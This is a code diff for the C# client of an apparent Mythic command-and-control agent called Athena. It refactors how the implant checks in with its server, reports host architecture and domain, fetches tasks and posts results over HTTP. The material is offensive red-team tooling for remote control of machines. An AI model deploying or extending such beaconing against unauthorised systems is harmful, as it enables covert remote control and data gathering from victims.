@@ -1,9 +1,9 @@
 ﻿using Athena.Mythic.Hooks;
+using Athena.Config;
 using System;
 using System.Collections.Generic;
 using System.Threading.Tasks;
 using Athena.Mythic.Model.Checkin;
-using Athena.Mythic.Profile;
 using System.Net;
 using System.Diagnostics;
 using Athena.Utilities;
@@ -17,10 +17,10 @@ namespace Athena
 {
     public class MythicClient
     {
-        public Config2 MythicConfig { get; set; }
-        public MythicClient()
+        public MythicConfig MythicConfig { get; set; }
+        public MythicClient(MythicConfig conf)
         {
-            this.MythicConfig = new Config2();
+            this.MythicConfig = conf;
         }
 
         public CheckinResponse CheckIn()
@@ -29,6 +29,7 @@ namespace Athena
             {
                 //encrypt
             }
+            /**
             switch (Globals.profile)
             {
                 case ProfileType.HTTP:
@@ -38,6 +39,7 @@ namespace Athena
                 case ProfileType.SMB:
                     break;
             }
+            **/
             Checkin ct = new Checkin()
             {
                 action = "checkin",
@@ -50,7 +52,7 @@ namespace Athena
                 architecture = Misc.GetArch(),
                 domain = Environment.UserDomainName,
             };
-            var responseString = SendPOST(this.MythicConfig.postURL, ct).Result;
+            var responseString = Send(ct).Result;
             try
             {
                 CheckinResponse cs = JsonConvert.DeserializeObject<CheckinResponse>(Misc.Base64Decode(responseString).Substring(36));
@@ -73,7 +75,7 @@ namespace Athena
             try
             {
 
-                var responseString = SendPOST(this.MythicConfig.postURL, gt).Result;
+                var responseString = Send(gt).Result;
                 Console.WriteLine("Response: " + Misc.Base64Decode(responseString).Substring(36));
                 GetTaskingResponse gtr = JsonConvert.DeserializeObject<GetTaskingResponse>(Misc.Base64Decode(responseString).Substring(36));
                 return gtr.tasks;
@@ -153,7 +155,7 @@ namespace Athena
 
             try
             {
-                var responseString = SendPOST(this.MythicConfig.postURL, prr).Result;
+                var responseString = Send(prr).Result;
                 Console.WriteLine("Response: " + Misc.Base64Decode(responseString).Substring(36));
                 PostResponseResponse cs = JsonConvert.DeserializeObject<PostResponseResponse>(Misc.Base64Decode(responseString).Substring(36));
                 if (cs.responses.Count < 1 || cs.responses[0].status != "success")
@@ -180,6 +182,23 @@ namespace Athena
                 return "";
             }
         }
+
+        public async Task<string> Send(object message)
+        {
+            bool http = true;
+            bool websocket = false;
+
+            if (http)
+            {
+                return await this.MythicConfig.httpConfig.Send(message);
+            }
+            else if (websocket)
+            {
+                return "";
+            }
+            else return "";
+        }
+        /**
         private async Task<string> SendPOST(string url, object obj)
         {
             try
@@ -195,5 +214,6 @@ namespace Athena
                 return "";
             }
         }
+        **/
     }
 }
